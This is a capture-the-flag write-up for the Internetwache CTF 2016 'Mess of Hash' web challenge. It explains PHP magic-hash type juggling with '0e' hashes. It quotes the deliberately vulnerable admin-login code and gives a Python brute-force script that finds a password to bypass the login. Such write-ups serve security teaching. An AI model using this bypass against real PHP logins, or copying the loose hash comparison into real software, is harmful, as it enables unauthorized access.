# Internetwache CTF 2016 : Mess of Hash

**Category:** Web
**Points:** 50
**Solves:** 143
**Description:**

> Description: Students have developed a new admin login technique. I doubt that it's secure, but the hash isn't crackable. I don't know where the problem is...
>
>
> Attachment: [web50.zip](./web50.zip)
>
>
> Service: <https://mess-of-hash.ctf.internetwache.org/>

Sources: <https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web50/code>

## Write-up

Writeup by [unicornsasfuel](https://github.com/unicornsasfuel)

PHP is weird. No doubt about it. There are a lot of quirks.

One of PHP's quirks is that strings will be interpreted as numbers in scientific notation if they are in the right format, specifically <number>e<number>. If such a number starts with `0e`, it is effectively `0`. If two strings match these parameters and are compared through the double-equals operator (which, importantly, allows for type conversion from string to number), they will always match as they are both effectively `0`.

It is possible for a hashing algorithm to produce such a hash, though the chances are roughly one in 200 million. Through CTF challenge magic, the admin hash `0e408306536730731920197920342119` matches these conditions.

~~~PHP
<?php

$admin_user = "pr0_adm1n";
$admin_pw = clean_hash("0e408306536730731920197920342119");

function clean_hash($hash) {
    return preg_replace("/[^0-9a-f]/","",$hash);
}

function myhash($str) {
    return clean_hash(md5(md5($str) . "SALT"));
}
~~~

There are published values whose md5 sums match these conditions, but as we can see above, the hashing algorithm is custom, so we must perform our own search. Below is a Python solver script which provides us the password we need:

~~~Python
import md5
import string
import sys

def do_0e_check(inhash):
   if inhash[:2] == '0e':
      print 'hash %s begins with 0e' % inhash
      if all([char in string.digits for char in inhash[2:]]):
         return True
   return False

i = int(sys.argv[1])
answer = 0

print "Starting cracking process..."

while True:
   hashcandidate = md5.new(md5.new(str(i)).hexdigest()+'SALT').hexdigest()
   if do_0e_check(hashcandidate):
      break
   else:
      i += 1
      if i % 100000 == 0:
         sys.stdout.write("\rCurrent i value: %s" % i)
         sys.stdout.flush()

print "Answer found: md5(md5(%s)+'SALT') matches" % (i)
~~~

Logging in with username `pr0_adm1n` and the found password results in a successful login and the disclosure of the flag.

## Other write-ups and resources

* <https://forum.xeksec.com/f138/t88657/>
* <https://www.xil.se/post/internetwache-2016-web-50-simonvik/>
* <https://eugenekolo.com/blog/internetwache-2016-ctf-writeups/>
* <https://blog.amishsecurity.com/internetwache-ctf-2016-web50-mess-of-hash/>
* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-02-20-internetwache/web_50)
* <http://pastebin.com/K4xGYGMK>
